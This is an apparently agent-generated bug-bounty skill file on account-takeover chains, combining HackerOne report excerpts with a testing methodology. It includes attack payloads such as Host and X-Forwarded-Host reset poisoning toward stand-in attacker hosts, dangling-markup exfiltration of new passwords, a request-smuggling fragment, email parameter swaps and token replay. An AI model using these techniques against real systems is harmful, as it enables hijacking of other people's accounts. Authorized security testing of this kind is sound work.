---
name: bbhunt-account-takeover
description: "Use when multiple primitives combine to control another account: reset poisoning, OAuth linking, session issues, token leakage, or email change. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Account Takeover Chains — unified skill

> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.

## Corpus evidence — 64 valid HackerOne reports (10 paid / 16%)

Every disclosed report is valid; payment is an impact signal, not a validity test.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| subdomain / DNS / cert-transparency recon | 9 |
| admin / privileged-role context | 9 |
|  HosT/absolute-URL reset poisoning | 7 |
| employee / developer public info | 7 |
| Content-Type / body-format switch | 6 |
| encoding / double-encode / null byte | 6 |
| webhook / OAuth / SAML / integration abuse | 5 |
| file upload / filename / extension | 5 |
| XML / SOAP / SAML / XXE | 5 |
| header injection (Host / X-Forwarded / etc.) | 4 |
| HTTP method / verb tampering | 4 |
| two-account / cross-account replay | 4 |
| public source-code / repo review | 4 |
| internal service / port / container | 3 |
| WAF / sanitizer / filter bypass | 3 |
| DOM / HTML source inspection | 3 |
| cloud metadata / IAM abuse | 2 |
| third-party data / paste / breach reuse | 2 |
| fuzzing / wordlist brute force | 2 |
| second-order / stored / blind delivery | 2 |
| JWT / token / base64 decode | 2 |
| race / concurrency / timing | 2 |
| archive / Wayback endpoint discovery | 2 |
| cache / CDN / unkeyed header | 2 |
| API docs / Swagger / introspection | 1 |
| verbose debug / framework fingerprint | 1 |
| intercept & replay request in Burp | 1 |
| browser DevTools / network tab | 1 |
| JS bundle / source-map inspection | 1 |
| git history / exposed .git | 1 |
| OAST / DNS / HTTP callback proof | 1 |
| error message / stack trace probing | 1 |
| parameter pollution / duplicate keys | 1 |
| template injection (SSTI) | 1 |
| public bucket / storage exposure | 1 |
| response diff / status / length comparison | 1 |

### Parameters observed in writeups

`password` (2), `month` (2), `year` (2), `username` (1), `challenge` (1), `challenge_answer` (1), `url` (1), `page.` (1), `risk.` (1), `approved` (1), `address` (1), `takeover` (1), `scope` (1)

### Bypass primitives observed

`content-type` (13), `bypass` (12), `bypassing` (2), `whitelist` (2), `parameter pollution` (2), `blind` (2), `%00` (1), `blacklist` (1), `header injection` (1)

### Impact language observed

`password` (68), `token` (48), `admin` (32), `credential` (18), `account takeover` (12), `unauthorized` (6), `privilege escalation` (3), `exfiltrate` (3), `rce` (3), `sensitive data` (2), `payment` (2), `exfiltration` (2), `secret` (1), `api key` (1), `remote code execution` (1), `sensitive information` (1), `full access` (1)

### Case studies — full excerpts (paid and unpaid)

#### [862589](https://hackerone.com/reports/862589) — Spring Actuator endpoints publicly available, leading to account takeover

LY Corporation · $5000 · critical

Due to insufficient access controls, it was possible to access the Spring Boot Actuator endpoints /heapdump and /env. The /heapdump endpoint leaks data from the Java Virtual Machine, leading to disclosure of admin credentials, user tokens and a combination of other data. This endpoint was not discovered by the internal security team due to being put on a custom path, avoiding detection through our usual means. The reporter accessing this endpoint also triggered a warning for our CSIRT team, allowing us to take quick and coordinated action. After quickly restricting access to this endpoint, we investigated and found no activity except that of the reporter. The maximum impact of this issue was potential takeover of random LINE Official Accounts through leaked tokens/cookies. We appreciate the professionalism and clear communication from @kazan71p and want to thank him for helping keep LINE secure.

#### [2798380](https://hackerone.com/reports/2798380) — Hackerone supports accounts organitation takeover

HackerOne · $2500 · medium

## Description: - I have discovered a vulnerability in HackerOne's email change process where the system automatically verifies the email address if the verification link is opened in any browser. This behavior differs from report #2128237, as it affects specific situations where email scanning bots automatically open links without human interaction. - The issue arises because some email services, such as security bots that scan emails and analyze links, automatically open verification links. In certain cases, these bots do not validate whether the email originates from a "no-reply" address or another that should prevent verification. By exploiting this behavior, an attacker can verify email addresses without the legitimate owner’s interaction, allowing them to register email addresses as if they belong to a specific company. ## Reproduction Steps: 1. Register an account on HackerOne with any valid email address. 2. Change the email of the account to one belonging to a company that uses email scanning bots (e.g., certain security solutions). example ██████ 3. If the email system of the target automatically scans the link without properly checking the email nature, the email address will be verified without any human action. 4. This allows the attacker to use a fake corporate email address without the legitimate owner’s consent. - In this case, HackerOne attempts to request SAML

#### [1266828](https://hackerone.com/reports/1266828) — Staff who only have apps and channels permission can do a takeover account at the wholesale store (Bypass get invitation link)

Shopify · $1600 · medium

When we invite customers at the wholesale store there is a feature to "Send invite" and "Get invite link" the get invite link feature displays the customner invitation link and can only be used once, but when the customer has accepted the invitation and actived their account already have access to wholesale store then these 2 features will not be able to be used again, this works as it should and the invitation link itself can be used to change the customer's account password, maybe this is why the "Get invite link" feature cannot be used again when the customer has activated his account because to avoid takeover accounts, but here I found a vulnerability to bypass getting an activated account customer invite link so that staff who only have Wholesale permission can get an invitation link even though the customer has activated his account which causes the takeover account Step to reproduce : I tested with Shopify plus partner sandbox store 1. Login to the store using the account staff who only has permission to wholesale 2. At wholesale customers, customers whose accounts are already active will have the status of Enable {F1380035} 3. Here you will not be able to use the Send invite and Get invite link features, and if you use these features you will get an error Error when using the send invite feature : {F1380038} Error when using the Get invite link feature : {F1380040} Here

#### [1626205](https://hackerone.com/reports/1626205) — Wordpress Takeover using setup configuration at http://████.edu [HtUS]

U.S. Dept Of Defense · $1000 · critical

Description: The WordPress 'setup-config.php' installation page allows users to install WordPress in local or remote MySQL databases. This typically requires a user to have valid MySQL credentials to complete. However, a malicious user can host their own MySQL database server and can successfully complete the WordPress installation without having valid credentials on the target system. Reproduce step by step: I found this vulnerable url: Then i configured db I used this site After configure I got wordpress admin access proof: Admin credentials that I set after installing the config username: ████████ password: ███ Login Panel: Video POC has been attached as well. ## Impact Impact Remote Code Execution/Total system compromise. Attacker can upload webshell into the server. I did not upload any shell for security violation. Malware distribution Phishing / Spear phishing XSS Authentication bypass

#### [1679734](https://hackerone.com/reports/1679734) — Account Takeover Vulnerability in Shopify Collabs Platform Due to Missing Email Verification

Shopify · $800 · low

## Summary: Shopify collabs (collabs.shopify.com) is a new platform for content creators / influencers to discover and advertise the millions of brands of Shopify. The content creators can apply for different brands on this platform and get paid (affiliate marketing). In the past, the features of this new platform were provided by Dovetale ( but Dovetale was now * migrated to Shopify (via an extra app for the **brands** * replaced by the new platform collabs.shopify.com for the **creators** I found a way to take over the account of **arbitrary creators** by using the new platform collabs.shopify.com. If a creator applies to be an ambassador of a brand with his email address, an attacker is also able to create a new Shopify ID and sign up at collabs.shopify.com with the **victim's email address**. Due to the fact that there is no email verification needed for using collabs.shopify.com, the attacker is thus able to take over the victim's account. ## Shops Used to Test: ██████ ## Steps To Reproduce: ### Setup 1. (Brand) Install the new Shopify collabs app ( to your store and create an application page for the creators 2. (Victim/Creator) Use the public link to apply for being an ambassador for the brand. You can find the link in the Dashboard of the app: {F1875876} 3. (Victim/Creator) Follow the application process. Choose an email address (kun_19+takeover@wearehackerone.com in my

#### [867513](https://hackerone.com/reports/867513) — Takeover an account that doesn't have a Shopify ID and more

Shopify · no bounty — still valid · critical

## Details The can be exploited to update a staff member email without any email confirmation. Using the partner dashboard, we've the ability to create a store that doesn't have a Shopify ID account on By using these two together, all we have to do is create an arbitrary store to an email that we own and confirm it with received email, then use the the POS Staff endpoint to update our email without having to validate it. You'll then be prompted to create a Shopify ID for your stores (the new created one alongs with the victim stores) and you won't need to validate that you own the email since it is already verified. ## Steps to reproduce 1. Have a victim with a shop that doesn't have a Shopify ID 1. Open and create a development store 1. Within the store creation form, you'll need to update your shop email to one that doesn't exist within Shopify and that you own (so it can be validated). As the field is read-only, that can either be done by intercepting the request with an application like Burp or do the above **within your browser console** to update the form object. 1.. Validate that you own the email address (Link sent to your email) 1. Add the **POS** to your shop **Sales Channels** 1. Open up the **POS > Staff** 1. Save your own staff page and copy the CURL request by using browser inspection 1. Replace the CURL payload email field with the victim email and send the reque

#### [759454](https://hackerone.com/reports/759454) — Helpdesk Takeover at dmc.datastax.com

DataStax · no bounty — still valid · high

## Summary: DNS record [dmc.datastax.com](dmc.datastax.com) is pointing to stale [dmc-support.zendesk.com](dmc-support.zendesk.com) domain on Zendesk which is available for takeover. DNS Stale Records: {F661014} ## Proof of Concept: There was no helpdesk configured at this address, which means that the address was available and anyone could claim it. I was able to claim dmc-support.zendesk.com. On this page, I haven't made the page public, I'm attaching a screenshot of the webpage: {F661004} ## Supporting Material/References: Login page: {F661021} ## Impact Subdomain takeover

### Recurring approach patterns from real reports

- 1× so i was able to claim the domain for my own host and thus can place content on this url
- 1× description i have noticed that there is no security check at changing password
- 1× hi summary i have found a design issue on the e mail change functionality offered by the accounts profile handler
- 1× i changed my email1 to email2 through profile
- 1× it was failed and when i used email2 its working
- 1× the researcher was able to pass verification to another account by finding confirmation data in response from the server
- 1× i was able to claim dmc support zendesk com
- 1× also attached is the apk of the malicious app i used as poc and for the video
- 1× after quickly restricting access to this endpoint we investigated and found no activity except that of the reporter
- 1× f859739 flag flag 736c635d8842751b8aafa556154eb9f3 flag in this report i ll try to focus more on my way of thinking rather than on the technical implementation so others will be able to learn what i ve learned and use it to hit harder and make our world a safer place
- 1× ctf walkthrough recon i ve started the challenge by performing two basic recon steps subdomain enumeration with subfinder subfinder d bountypay h1ctf com
- 1× finding credentials in the log file i was able to find base64 encoded strings to make it easier to work with i used the following bash liner which prints only the base64 decoded payload the next step was to actually try and log in with the exposed username and password username brian oliver password v7h0inzx but it required me to do a factor authentication
- 1× f859768 finding the next door ssrf via load transactions functionality now that i was logged in as brian i saw the bountypay dashboard with no transactions
- 1× during the recon phase i also found out two more things that now come handy
- 1× in there is a link to google with an explanation on what is rest api but the link isn t referring directly to google but to an internal redirect endpoint which have some kind of urls whitelist by combining those two clues i decided to enumerate files directories in the software subdomain and was able to achieve it by chaining the ssrf vulnerability with the semi open redirect
- 1× i created a simple bash script that gets a url and generates the base64 encoded cookie value
- 1× i created the payloads list and used ffuf for the enumeration one of the responses contained the following data which tells us that directory listing is enabled in uploads and that there is an apk file there
- 1× i was then able to download the file from android application reverse engineering challenge i started by installing the application on a local android studio emulator
- 1× then once i clicked the money bag button at the bottom of the app i saw the following notification f860987 deep links
- 1× let s open up the code in order to start reverse engineering the application i used multiple tools and techniques which will now be explained
- 1× i used apktool to unpack the apk file
- 1× once the apk is unpacked we can investigate things like the manifest file and look for hard coded strings
- 1× after i searched for hard coded strings like urls tokens and api keys without success i moved on to investigating the deep links
- 1× i used dex2jar and jd gui to decompile the code and view it as java files

## Corpus-backed method (this class)

1. Do not hunt 'ATO' directly — first identify the concrete primitive (reset, OAuth, session, XSS, CSRF, IDOR).
2. Establish attacker and victim accounts and the exact action the victim does or does not take.
3. Enumerate every identity-binding step: email, token, session, OAuth subject, and device remember.
4. Demonstrate control of the victim's session or authentication material without their credentials or unusual actions.
5. Minimize the victim interaction; a chain requiring the victim to click an attacker link is still valid, one requiring credentials is not.
6. Prove the consequence (access to victim data/actions) and redact all victim data in evidence.

### Signals

- Identity is determined by a client-supplied email, ID or token
- Reset/email-change/OAuth flows that can be influenced
- Any primitive that changes authentication state for another identity

### Kill criteria

- Requires the victim's password or second factor.
- Only changes data on an account you already control.
- Victim must take unusual, security-unaware actions beyond a normal link click.

### Escalation chains

- Open redirect -> OAuth code -> ATO.
- Reset poisoning -> token capture -> ATO.
- Auth bypass -> session issuance -> ATO.

### Probes

- Dual-recipient reset requests, redirect_uri manipulation, email change without verification, session reuse.

### Veteran tip

ATO is usually the *escalation* from another class — load the root-cause class skill first, then this one for the final proof.

## Unified upstream methodology (complete, deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Enumerate ATO primitives: reset, email change, OAuth linking, OTP, session fixation.
- Test email-change flows for missing verification, race, and token leakage.
- Look for reset-token leakage via Referer, host-header poisoning, and shared caches.
- Test account merging/linking and pre-registration takeover.

### Deeper checklist

- Enumerate ATO primitives: password reset, email change, OAuth linking, OTP, session fixation.
- Test email-change flows for missing verification, race conditions, and token leakage.
- Look for reset-token leakage via Referer, host-header poisoning, and shared caches.
- Test account merging/linking and pre-registration takeover.
- Chain lower-severity bugs (XSS, CSRF, IDOR) into ATO.
- Demonstrate login to a victim account you control, with a clear step-by-step PoC.

### A. Discovery checklist — concrete places, params, headers, flows to look

- Enumerate every recovery path, not just `/forgot-password`: `/reset-password`, `/password/reset`, `/api/public/passwords/`, `/change-email`, `/verify-email`, `/confirm`, `/activate`, `/magic-link`. The 2025 Beek Labs case ($3,000, 1.3M users) found a forgotten reset API only by reversing references out of the JS bundle — grep bundles for `reset_password`, `token`, `authenticationToken`, `pin`, `jobId`.
- For each reset request, record which values build the absolute link. Probe `Host`, `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, and dual `Host` headers. PortSwigger's canonical lab uses `X-Forwarded-Host: YOUR-ID.exploit-server.net` on `POST /forgot-password`.
- Identify the token carrier: query param (`temp-forgot-password-token`, `reset_password_token`), body field, cookie, or fragment. Note whether the token is also echoed in the JSON response body — Beek Labs saw full PII + reset token + session token in a `201 Created`.
- Look for client-controlled URL parameters in the reset call: `reset_password_path`, `redirect_url`, `base_uri`, `callback`, `return_to`. A user-controlled `reset_password_path` is an independent poisoning primitive even when Host is pinned (CVE-style "absolute URL link poisoning").
- Map the whole state machine: request → email → token validation → form submit → token destruction. Check each hop for binding: is the token tied to an account, a session, an IP, a timestamp?
- Check "remember me" cookies for predictable concatenation of username + timestamp (PortSwigger). Decode Base64/JSON; look for `user|timestamp`, `md5(username+password)`, unsalted hashes that can be brute-forced offline.
- Secondary surfaces: hidden `username`/`email` fields in the password-change POST, account-linking endpoints, email-change confirmation links, security-question answers (OSINT-able), and stale links issued before a password change or 2FA enable.
- Note whether tokens are timestamp-derived (PortSwigger "Time-sensitive attacks") — two resets for two users at the same timestamp can yield the same token.

- Check whether link-building uses a template engine or framework helper that reads a configurable base URL (`application_url`, `APP_URL`, `SITE_URL`, `base_url`, `frontend_url`); if that config can be influenced via a parameter or a hosted config file, the link is poisonable even with a correct Host.
- Note the exact email HTML renderer: PortSwigger's dangling-markup lab sanitizes with DOMPurify for the rendered view but leaves the "view as raw HTML" path unsanitized — test both views, since the raw path is the exploitable sink.
- Capture whether the reset request itself requires authentication. An unauthenticated reset that accepts an arbitrary email/username is the precondition for both poisoning and 0-click parameter swap.
- Record every response field from the reset request (JSON keys, status, `Set-Cookie`, `Location`) — a mismatched `201` that returns a full user object is a strong signal of a debug/legacy endpoint.
- Check the token's binding surface: compare a token requested via Chrome vs Firefox, different IP, different User-Agent, and a different session; an unbound token is reusable across all of them.
- Look at the password-change POST for a hidden or predictable `user_id`/`uid` next to `email` — swapping both is often required when `email` alone is validated.
- Inventory email-change confirmation links: the classic pattern is attacker requests change to their own address, sends the confirmation link to the victim, and the victim's click binds the victim account to the attacker's email, enabling a later password reset.
- Check whether a password reset invalidates existing sessions. A token that changes the password but leaves the victim's live session untouched may not yield a usable ATO — record this during validation.
- For financial targets, check whether the same reset/session token is accepted by the withdrawal or payout API — this determines whether the impact is account access alone or direct fund movement (Beek Labs: $3,000 bounty, finance platform).

### Signals and surfaces

### Signal

- Reports: **262** · paid: **39**
- Median bounty **$1,500** · p90 **$10,500** · max **$35,000** · total **$144,138**
- Median upvotes **36**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 2 | $37,450 | 1088 |
| HackerOne | 6 | $22,500 | 2145 |
| Uber | 6 | $21,000 | 787 |
| Mail.ru | 27 | $14,550 | 1730 |
| TikTok | 4 | $12,000 | 724 |
| Superhuman (formerly Grammarly) | 3 | $10,500 | 628 |
| Chaturbate | 2 | $8,000 | 67 |
| LY Corporation | 2 | $5,000 | 708 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`reset` `email` `verify` `oauth` `link` `otp` `mfa` `session`

### Techniques, payloads and bypasses

### Payloads & probes

- Host header -> `Host: evil.com` in reset request
- Email -> `victim@example.com` with unicode/plus/dot variants
- OAuth -> link attacker provider to victim email
- OTP -> brute force, reuse, response leakage

### Bypass tricks

- Chain XSS/CSRF/IDOR into the ATO path.
- Abuse email normalization and case sensitivity.
- Race the email-change confirmation.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Takeover an account that doesn't have a Shopify ID and more** — `#867513` · Shopify · $0 · ▲3006
  > Save your own staff page and copy the CURL request by using browser inspection
- **Account Takeover via Password Reset without user interactions** — `#2293343` · GitLab · $35,000 · ▲989
  > Forward the requests and you should get an email containing the reset link that was send to both emails (``victim@gmail.com`` and ``attacker@gmail.com``) .
- **Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies** — `#737140` · Slack · $0 · ▲870
  > The CLTE issue found on slackb.com is when the frontend server interprets the request sized using `Content-Length` and the backend server interprets the request using the `Transfer-Encoding: chunked` method.
- **Bypassing Digits origin validation which leads to account takeover** — `#129873` · X / xAI · $0 · ▲619
  > In short, the event origin is checked against Digits' origin in this line:`-1 !== this.config.get("sdk host").search(t.origin)`, which is the same as `-1 !== "https://www.digits.com".search(t.origin)`.
- **Request smuggling on admin-official.line.me could lead to account takeover** — `#740037` · LY Corporation · $0 · ▲565
  > The reporter identified a request smuggling issue on admin-official.line.me [(TE.CL-type).](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) The reporter clearly illustrated the impact without putting our users at risk or…
- **Flickr Account Takeover using AWS Cognito API** — `#1342088` · Flickr · $0 · ▲440
  > The `access token` can be directly used against Amazon's AWS API, for instance using the [AWS Command Line Interface](https://docs.aws.amazon.com/cli/) tool:
- **Full account takeover** — `#314808` · Reverb.com · $0 · ▲412
  > Reverb ios application is not validating facebook `access token` on the server side in login api, which allows an attacker to hack all account using his own app access token.
- **[CSRF] TikTok Careers Portal Account Takeover** — `#1010522` · TikTok · $0 · ▲366
  > If you have any feedback, feel free to ping me at [Twitter](https://twitter.com/ lauritz ).
- **[cs.money] Open Redirect Leads to Account Takeover** — `#905607` · CS Money · $0 · ▲357
  > Open this url `https://auth.dota.trade/login?redirectUrl=https://cs.money///loving-turing-29a494.netlify.app%2523&callbackUrl=https://cs.money///loving-turing-29a494.netlify.app%2523` , the login url was gotten from `cs.money` index page button `sign in…
- **yelp.com XSS ATO (via login keylogger, link Google account)** — `#2010530` · Yelp · $0 · ▲324
  > This should be parsed as 1 cookie `a` with the value "`1 b=2`", but Yelp will parse it as 2 cookies `a` and `b`.
- **Change any Uber user's password through /rt/users/passwordless-signup - Account Takeover (critical)** — `#143717` · Uber · $0 · ▲312
  > Through the endpoint at /rt/users/passwordless-signup it is possible to change the password of any Uber user, given knowledge of their phone number (or by just enumerating phone numbers until one is found that is registered with Uber - not too hard given the…
- **Account takeover through the combination of cookie manipulation and XSS** — `#534450` · Superhuman (formerly Grammarly) · $0 · ▲292
  > Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar containerid with the second stage of our payload and the redirect the user to the vulnerable page.
- **[CRITICAL] 0-Click Account Takeover via Password Reset [AUTH-3243] /orchestrator/v1/password_reset/start** — `#2831902` · Remitly · $0 · ▲291
  > 4-----Intercept the HTTP request using a proxy tool like Burp Suite or OWASP ZAP when submitting the password reset request.
- **Insufficient OAuth callback validation which leads to Periscope account takeover** — `#110293` · X / xAI · $0 · ▲277
  > callback url = a/../../login?redirect after login=https://cards.twitter.com/card id
- **Ability to DOS any organization's SSO and open up the door to account takeovers** — `#976603` · Superhuman (formerly Grammarly) · $10,500 · ▲260
  > So if you have `myentity` as the legitimate entity, and an attacker sets their entity to `myentity[SPACE]` (with a space at the end); users attempting to authenticate into the legitimate `myentity` will technically authenticate against it, but then the…
- **Singapore - Account Takeover via IDOR** — `#876300` · Starbucks · $0 · ▲260
  > ko2sec discovered that an alternate site shared database and cookie credentials with card.starbucks.com.sg.
- **Mass Account Takeover at https://app.taxjar.com/ - No user Interaction** — `#1581240` · Stripe · $0 · ▲253
  > The vulnerability was caused by a leaked token in the delete invitation request feature and resolved by using the invitation ID instead of the token to look up the user’s invite when deleting an invitation.
- **Account takeover of existing HackerOne accounts through SCIM provisioning** — `#3178999` · HackerOne · $0 · ▲232
  > If the attacker with verified domain as `verified.com` adds a victim as `victim@ato.com` to Okta, with the username as `victim@ato.com` and email field as `victim@verifed.com`, the victim's email will be changed, AND no notification will be sent to the victim…
- **1 Click Account Takeover via Auth Token Theft on marketing.hostinger.com** — `#3081691` · hostinger · $0 · ▲219
  > This vulnerability poses a significant risk to Hostinger users, as it allows attackers to bypass authentication and gain unauthorized access to accounts with just one click.
- **Account Takeover in Periscope TV** — `#317476` · X / xAI · $0 · ▲213
  > When you login periscope.tv using twitter, and change the host header from `www.periscope.tv` to `attacker.com/www.periscope.tv`, the oauth redirect destination will be `attacker.com/www.periscope.tv`, thus allowing attacker to send the oauth authorize link…
- **IDOR when editing users leads to Account Takeover without User Interaction at CrowdSignal** — `#915114` · Automattic · $0 · ▲202
  > If you click `Edit` button on any user of your team at https://app.crowdsignal.com/users/list-users.php, you will send a GET request to `https://app.crowdsignal.com/users/invite-user.php?id=(userid)&popup=1`
- **Helpdesk Takeover at dmc.datastax.com** — `#759454` · DataStax · $0 · ▲195
  > On this page, https://dmc.datastax.com/hc/en-us I haven't made the page public, I'm attaching a screenshot of the webpage:
- **1 click Account takeover via deeplink in [com.kayak.android]** — `#1667998` · KAYAK · $0 · ▲173
  > https://fluidattacks.com/blog/account-takeover-kayak/
- **Account Takeover via Authentication Bypass in TikTok Account Recovery** — `#2443228` · TikTok · $12,000 · ▲172
  > I identified a critical vulnerability in one of TikTok's endpoints that permitted unauthorized changes to user accounts due to improper parameter handling.
- **SSRF in Autodesk Rendering leading to account takeover** — `#3024673` · Autodesk · $0 · ▲161
  > A server side request forgery (SSRF) vulnerability was found in Autodesk Rendering, which could have allowed an attacker to send a malicious link to a victim and gain control of their account while logged in.
- **Cache Deception Allows Account Takeover** — `#1698316` · Expedia Group Bug Bounty · $0 · ▲160
  > I'm able to extract user's session (HASESSIONV3) as it is disclosed in a cacheable page, allowing me to access the `ha.crumb` token located in `/traveler/profile/edit`
- **Hackerone supports accounts organitation takeover** — `#2798380` · HackerOne · $2,500 · ▲155
  > - In this case, HackerOne attempts to request SAML authentication, but you bypass it, allowing you to log in to other services like PullRequest.com under the affected company’s identity.
- **Account takeover - improper validation of jwt signature (with regards  to experiation date claim)** — `#1760403` · Linktree · $0 · ▲147
  > I was able to bypass validation by changing the expiration date to a date in the past.
- **Open Redirect on central.uber.com allows for account takeover** — `#206591` · Uber · $0 · ▲144
  > When logging into `central.uber.com`, the `state` parameter for login.uber.com contained a redirect location instead of a CSRF token.
- **Spring Actuator endpoints publicly available, leading to account takeover** — `#862589` · LY Corporation · $5,000 · ▲143
  > This endpoint was not discovered by the internal security team due to being put on a custom path, avoiding detection through our usual means.

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 5× | `victim@ato.com` |
| 3× | `attacker@example.com` |
| 3× | `@import` |
| 2× | `GET https://<URL> HTTP/1.1` |
| 2× | `demo-member@hackerone.com` |
| 2× | `https://cdn.kastatic.org/khanacademy/khanacademy.<hash>.js.map` |
| 2× | `badca7@wearehackerone.com` |
| 2× | `application%5Bid%5D` |
| 2× | `check_alter_user()` |
| 2× | `$regex` |
| 2× | `loadDataWithBaseURL()` |
| 2× | `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$` |
| 2× | `<input>` |
| 1× | `user[email]":"victim@gmail.com` |
| 1× | `victim@gmail.com` |
| 1× | `attacker@gmail.com` |
| 1× | `GET / HTTP/1.1 / Transfer-Encoding : chunked / Host: slackb.com / User-Agent: Smuggler/v1.0 / Content-Length: 83 / 0 / GET <URL> HTTP/1.1 /` |
| 1× | `https://<URL>` |
| 1× | `Burp->Burp Collaborator Client` |
| 1× | `host: slackb.com , Port: 443 (SSL)` |

### Bypassing Digits origin validation which leads to account takeover

`#129873` · X / xAI · $0 · n/a · 2020-06-24 · ▲619
> Hi, I would like to report an important issue that affects websites that has integrated "Signin with Digits" , leading to potential account takeover. Detail In Digits architecture, the data communication channel between Digits and customer's site relies on postMessage() .

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Basic poisoning: `POST /forgot-password` with `username=carlos` and `Host: attacker.net` (or `X-Forwarded-Host: attacker.net`) → read the stolen `temp-forgot-password-token` from the attacker access log → replay on the *real* domain reset URL.
- Header bypass matrix from a 2025 €900 0-click writeup: `X-Forwarded-Host`; inverted Host pair (`Host: evil.com` + `X-Forwarded-Host: redacted.com`); `X-Forwarded-For` swap/flip; `Host: evil.com.redacted.com`; `Host: redacted.com.evil.com`; absolute-form target `POST / https://endpoint/ HTTP/1.1` with `Host: http://evil.com` to get 200/302 where plain form gave 403/404.
- Broken-logic variant: request your own reset, open the form, then in `POST /forgot-password?temp-forgot-password-token=...` delete the token value from both URL and body and set `username=carlos` — if the app still resets, the token is never revalidated at submit time.
- 0-click email-parameter swap: intercept the final password-change POST, change only the `email` field attacker → victim; a trailing opaque "authenticity" param may be decorative. A `200 {"status":true}` plus successful victim login confirms it.
- Dangling-markup injection when the Host is numeric-only validated but an arbitrary port is accepted: `Host: target.net:'<a href="//attacker.net/?` breaks out of a single-quoted string in the email HTML and exfiltrates the rest (including the new password) via `GET /?...` when the mail renderer/AV scanner fetches the link (PortSwigger dangling-markup lab).
- Response-body token exposure: reconstruct a hidden API call from JS, then `POST /api/public/passwords/ {"reset_password_path":"https://evil.com/","email":"victim@..."}` and read `authenticationToken`/reset token straight from the JSON — three independent takeover vectors from one endpoint.
- CVE-2025-29036 style: when `application_url` is unset, Kanboard builds reset links from `SERVER_NAME` (Host-derived); `Host: myevilsite.com` yields `http://myevilsite.com/forgot-password/change/<token>`. Patched in 1.2.46.
- Token entropy/time attacks: collect 10+ tokens for your own account and check sequentiality; try two parallel resets for two users to collide a timestamp-seeded token (predict → probe → prove with single-packet HTTP/2).
- Race the final state: parallelize "issue reset" and "consume reset" so the session ends with the victim's user ID but the attacker's token (PortSwigger single-endpoint race pattern).

- Predictable-token variant without poisoning: if the reset URL is `?user=victim-user` rather than a token, change the username directly to reach the reset form (PortSwigger "Resetting passwords using a URL"). Combine with a hidden `username` field in the submit POST.
- Token-not-revalidated + token-reuse: after a successful reset, replay the same token a second time. If it still works, the token is neither single-use nor destroyed — a distinct finding from broken submit-time binding.
- Mailer host injection via `X-Forwarded-Host` behind a reverse proxy: the origin sees the correct `Host`, but the framework builds absolute URLs from the forwarded header. Test both headers *independently* and together; record which one the mailer trusted.
- Inverted-Host trick: `Host: evil.com` with `X-Forwarded-Host: redacted.com` sometimes passes proxy validation while the app still uses the attacker's `Host` for link generation — try all four permutations of the two headers.
- Absolute-form request line bypass: `POST https://target.net/forgot-password HTTP/1.1` with `Host: attacker.net` can slip past naive path/Host checks that reject the normal origin-form request (2025 €900 writeup).
- Parameter-pollution on the reset body: `email=victim@x&email=attacker@x` — different parsers (WAF vs app) may select different values, producing a token generated for one address and delivered to another.
- Stale-link chain with MFA: keep a reset link issued before the victim enables 2FA; after they enable it, replay the link — if it logs straight into the dashboard without an MFA challenge, this is an ATO that defeats the added factor (see MFA skill).
- Session-token leak chain: if the reset API returns `authenticationToken`, skip the password step entirely — replay the token as `X-User-Token` / `Authorization` against `/api/me` and a write endpoint to prove authenticated access without ever changing the password.
- Mass-verification across roles: repeat the chain against a test instructor and a test admin account to show the impact is privilege-independent (XHack case study) — this strengthens severity without touching real users.

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### C. Validation / proof bar — how to confirm and avoid false positives

- Reflected header ≠ stolen token. Require an actual token-bearing request arriving at your Collaborator/exploit-server log (`GET /reset?token=...`), then prove the token works on the canonical domain by completing the reset and logging in.
- Always use two self-controlled accounts (A attacker, B victim): start from A, end with a live authenticated session as B. Never target real users.
- Distinguish "token leaked" from "token reusable": a stolen token that is single-use or bound to IP/UA/session may die — confirm the reset completes end-to-end, not just that the email URL changed.
- For response-body leaks, show the exact JSON keys and a clean login as the victim; PII exposure alone is a separate finding, not automatically ATO.
- Beware AV-link-scanner false positives: a click inside an email client is not real victim interaction unless the app's own mail renderer fetches it; document who fetched the poisoned URL.
- Header-injection-only "the email contained evil.com" with a 403/404 or dead link is Informational. Tokens should expire quickly and be destroyed immediately after use; a token that still works later strengthens the finding.
- Severity gate: 0-click (parameter swap only) = Critical; 1-click poisoning with a real token captured and reset completed = Critical; enumeration-only or unbound-link-only = Low/Informational. Redact session cookies and other-user PII in the PoC.

- Confirm the stolen token is actually associated with the victim, not your own: the Collaborator request should carry the token from a reset requested *for the victim's username*, and the resulting login should be the victim account.
- If the email client itself fetches remote links (AV scanners, image proxies), document that the token arrived without a human click; this is a legitimate 0-click interaction in most bug-bounty threat models but should be stated explicitly.
- For parameter swap, show the pre-change and post-change request side by side with only the `email`/`username` field differing — reviewers reject reports where other fields changed and the root cause is ambiguous.
- Verify the fix surface: after the program patches `Host` handling, re-test `X-Forwarded-Host` and the absolute-form request line separately — partial fixes are common (XHack retest confirmed both).
- Do not claim ATO from a leaked reset token if the token is bound to the victim's session/UA/IP and cannot be replayed from your browser — the binding check is part of the proof, not a mitigating detail to ignore.
- Check the token's TTL: a link that expires in minutes narrows the exploit window but does not invalidate the finding; a link that never expires is an independent issue worth noting.
